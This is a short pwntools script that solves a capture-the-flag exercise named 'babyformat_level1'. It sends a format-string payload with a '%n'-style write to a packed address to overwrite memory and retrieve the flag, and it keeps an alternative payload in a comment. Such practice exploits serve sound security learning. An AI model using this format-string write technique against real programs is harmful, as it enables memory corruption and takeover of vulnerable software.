from pwn import process, p64

r = process("/challenge/babyformat_level1")
# both buf working
buf = b"%04199197d%14$ln" + p64(0x404050)
# buf = b"%4199197X%14$lnA" + p64(0x404050)
r.recvuntil(b"vulnerability:")
# print(buf)
r.sendline(buf)
# r.recvuntil(b"vulnerability:\n")
# r.sendline(b"END")
r.recvuntil(b'flag:')
r.interactive()
